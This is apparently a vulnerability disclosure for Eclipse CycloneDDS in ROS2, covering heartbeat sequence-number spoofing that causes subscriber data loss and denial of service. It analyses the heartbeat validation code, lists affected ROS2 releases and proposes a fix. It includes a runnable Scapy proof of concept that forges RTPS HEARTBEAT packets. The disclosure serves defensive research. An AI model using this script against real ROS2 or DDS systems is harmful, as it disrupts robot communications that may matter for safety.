# 1. Attack Summary

- **Preconditions**
    - Among ROS2 communication protocols, QoS must be in a state of operating in Reliable mode. 
    
            If the RoS policy is Reliable Mode, Request missing messages again based on Heartbeat packets (Acknack).
    
    - The attacker must exist on the network where the publisher and subscriber communicate and be able to intercept existing communication flow through packet sniffing.
        
        
- **Attack Details**
    - The attacker sniffs the RTPS packet between Publisher (Talker) and Subscriber (Listener) and then uses the Scapy tool to spoof the value of 'guid-prefix, src IP, dst IP, sport, dport, submessageID: HEARTBEAT (flag, octetsToNextHeader, reader/writerEntityId).
    - Subsequently, the Sequence Number within the Heartbeat message is maliciously manipulated to a very high Sequence Number and resent to the Subscriber. As a result, all data sent from the Publisher to the Subscriber is lost.
        - 1,2,3,4... If an attacker manipulates the increasing Sequence Number to 50 and then sends a packet, the Subscriber does not receive the data content from 5 to 49 and lost it, and receives  normal data after 50.
    - The attacked Subscriber cannot receive the Publisher's data afterward.
 
<br/>

# 2. Vulnerability Cause

### Code Analysis

1. **validate_heartbeat()**
    - clipse-cyclonedds/cyclonedds/src/core/ddsi/src/q_receive.c: #259
    - If the **`firstSN`** value is less than 0, or if the **`lastSN`** value is less than **`firstSN - 1`**, the message is determined to be incorrect and VR_MALFORMED is returned.
    
    ```c
    static enum validation_result validate_Heartbeat (Heartbeat_t *msg, size_t size, int byteswap)
    {
      if (size < sizeof (*msg))
        return VR_MALFORMED;
      if (byteswap)
      {
        bswapSN (&msg->firstSN);
        bswapSN (&msg->lastSN);
        msg->count = ddsrt_bswap4u (msg->count);
      }
      msg->readerId = nn_ntoh_entityid (msg->readerId);
      msg->writerId = nn_ntoh_entityid (msg->writerId);
      /* Validation following 8.3.7.5.3; lastSN + 1 == firstSN: no data; test using
         firstSN-1 because lastSN+1 can overflow and we already know firstSN-1 >= 0 */
      if (fromSN (msg->firstSN) <= 0 || fromSN (msg->lastSN) < fromSN (msg->firstSN) - 1)
        return VR_MALFORMED;
      // do reader/writer entity id validation last: if it returns "NOT_UNDERSTOOD" for an
      // otherwise malformed message, we still need to discard the message in its entirety
      return validate_writer_and_reader_or_null_entityid (msg->writerId, msg->readerId);
    }
    ```
<br/>

2. **accept_ack_or_hb_w_timeout()**
    - eclipse-cyclonedds/cyclonedds/src/core/ddsi/src/q_receive.c: #859
    - Compares the order or count of the current Heartbeat (**`msg->count`**) and the previous Heartbeat (**`wn->prev_heartbeat`**) to determine if the current Heartbeat message is new, or if it is the same as or older than the one previously received.
    
    ```c
    static int accept_ack_or_hb_w_timeout (nn_count_t new_count, nn_count_t *prev_count, ddsrt_etime_t tnow, ddsrt_etime_t *t_last_accepted, int force_accept)
    {
      /* AckNacks and Heartbeats with a sequence number (called "count"
         for some reason) equal to or less than the highest one received
         so far must be dropped.  However, we provide an override
         (force_accept) for pre-emptive acks and we accept ones regardless
         of the sequence number after a few seconds.
    
         This allows continuing after an asymmetrical disconnection if the
         re-connecting side jumps back in its sequence numbering.  DDSI2.1
         8.4.15.7 says: "New HEARTBEATS should have Counts greater than
         all older HEARTBEATs. Then, received HEARTBEATs with Counts not
         greater than any previously received can be ignored."  But it
         isn't clear whether that is about connections or entities.
    
         The type is defined in the spec as signed but without limiting
         them to, e.g., positive numbers.  Instead of implementing them as
         spec'd, we implement it as unsigned to avoid integer overflow (and
         the consequence undefined behaviour).  Serial number arithmetic
         deals with the wrap-around after 2**31-1.
    
         Cyclone pre-emptive heartbeats have "count" bitmap_base = 1, NACK
         nothing, have count set to 0.  They're never sent more often than
         once per second, so the 500ms timeout allows them to pass through.
    
         This combined procedure should give the best of all worlds, and
         is not more expensive in the common case. */
      const int64_t timeout = DDS_MSECS (500);
    
      if ((int32_t) (new_count - *prev_count) <= 0 && tnow.v - t_last_accepted->v < timeout && !force_accept)
        return 0;
    
      *prev_count = new_count;
      *t_last_accepted = tnow;
      return 1;
    }
    ```   
<br/>

3. **handle_submsg_sequence()**
    - eclipse-cyclonedds/cyclonedds/src/core/ddsi/src/q_receive.c: #2926
    - Within the handle_submsg_sequence function, if the validity check for the SMID_HEARTBEAT sub-message results in a VR_MALFORMED verdict, the function is designed to send a malformed packet. However, there is no code to verify the sequence of the packet.
    
    ```c
    #2926
    #handle_submsg_sequence() part

    #3048 
    case SMID_HEARTBEAT: {
            if ((vr = validate_Heartbeat (&sm->heartbeat, submsg_size, byteswap)) == VR_ACCEPT)
              handle_Heartbeat (rst, tnowE, rmsg, &sm->heartbeat, ts_for_latmeas ? timestamp : DDSRT_WCTIME_INVALID, prev_smid);
            ts_for_latmeas = 0;
            break;
          }
    
    #3193 
    if (vr != VR_MALFORMED) {
        return 0;
      } else {
        malformed_packet_received (rst->gv, msg, submsg, len, hdr->vendorid);
        return -1;
      }
    ```
    
    - However, the conditions for creating the above malformed packet can be acquired by the attacker through packet sniffing.
<br/>

# 3. Vulnerability Impact

- Looking at the logic of heartbeat processing in the q_receive.c file, `There is no validation for Heartbeat Sequence Number.`
- If an attacker arbitrarily includes a very high sequence number (e.g., 999999) in the HeartBeat message and sends it to the Subscriber, the Subscriber will `repeatedly send` an Acknack response to the Publisher that sent the sequence number (e.g., 999999).
- However, `actually, the missing messages (Heartbeat Sequence Number=99999) do not exist, which can result in a Denial of Service (DoS) condition in the system.`


<p align="center"><img src="https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/146199020/14df5f1b-d5a9-419b-8ae5-eed7c7f62cea" width="800" height="550"/>



  ## 3.1. Affected Version

- **Commint Analysis**
    - eclipse-cyclonedds/cyclonedds/src/core/ddsi/src/q_receive.c
    - Since the initial commit of the q_receive.c code (Valid Heartbeat function) on Apr 11, 2018, Heartbeat Sequence Attack Vulnerabilities have been present up to the current date.
    
| COMMIT TIME | COMMIT ID | Issue |
|:---:|:---:|:---:|
| Apr 11, 2018 | 1d9ce37aa7b14cfc026a3d9c3fa721a80187f58 | Initial Contribution |
| Mar 10, 2020 | d1ed8df9f343b1cd441e3cd7ceaa750b480b7ce9 | latest Contribution |


<br/>

# 4. Test Environment + PoC

- **Attack Environment Required Info**
    - Operating System : Ubuntu 22.04 LTS
    - ROS2 IRON CycloneDDS - 2 Docker environments (172.17.0.2, 172.17.0.3)
- **Attack Description**
    - **[Attacker]** Uses the scapy tool to include a random very high Sequence Number (ex. 999999) in a HeartBeat message and sends it to the Subscriber (Listener).
    - **[victim]**  The Subscriber (listener) does not receive the data sent by the publisher until the Sequence Number is 999999.

![image](https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/146199020/8fe3879b-d2cf-421a-885d-f99d17046b4c)

## 4.1. POC (Proof of concept)

```python
# made by CVEIssacGleaning
from scapy.all import *
from scapy.contrib.rtps import *

# RTPS Header
class RTPS(Packet):
    name = "RTPS Header"
    fields_desc = [
        XIntField("magic", 0x52545053),  # RTPS in hex
        XByteField("major", 2),
        XByteField("minor", 1),
        XShortField("vendor_id", 0x0110),
        XIntField("hostId", 0x01109b7f),
        XIntField("appId", 0x3e3008a7),
        XIntField("instanceId", 0x9df82ef1)
    ]

class RTPSSubMessage_HEARTBEAT(Packet):
    name = "RTPS HEARTBEAT"
    fields_desc = [
        XByteField("submessageId", 0x07),
        XByteField("flags", 0x01),
        XShortField("octetsToNextHeader", 0x1c00),
        X3BytesField("readerEntityIdKey", 0x000000),
        XByteField("readerEntityIdKind", 0x00),
        X3BytesField("writerEntityIdKey", 0x000015),
        XByteField("writerEntityIdKind", 0x03),
        LongField("firstAvailableSeqNumber", 0xf423f00),  
        LongField("lastSeqNumber", 0xf423f00),           
        XIntField("count", 0xf423f00)
    ]

for _ in range(2):  
	packet = Ether(src="02:42:ac:11:00:02" ,dst="02:42:ac:11:00:03") / \
		IP(src="172.17.0.2",dst="172.17.0.3") / \
		UDP(sport=50885, dport=7411) / RTPS() / RTPSSubMessage_HEARTBEAT()
	sendp(packet, iface="docker0")
```

## 4.2. Attack Outcome
- **QoS - `Reliable Pub/Sub`**
    - [Reliable Publisher] Talker → [Reliable Subscriber] Listener
      
|ROS2 Version|CycloneDDS|RMW - CycloneDDS|Attack Result|
|:---:|:---:|:---:|:---:|
|IRON|0.10.3-2|1.6.0-2|O|
|HUMBLE|0.10.3-1|1.3.4-1|O|
|GALACTIC|0.8.0-6|0.22.5-1|O|
|FOXY|0.7.0-1|0.7.11-1|O|

<br/>

# 5. Recommendations

- **A code must exist to verify the sequential increase in Seqenunce.**
    - ex) example code
    - When the previous sequence number is saved and the value of the currently incoming sequence number is not the same as the previous sequence number +1, it must be goto Malformed.
    
    ```c
    if(IncomingSeqN ≠ prevSeqN + 1){
    	goto Malformed
    }
    ```
    
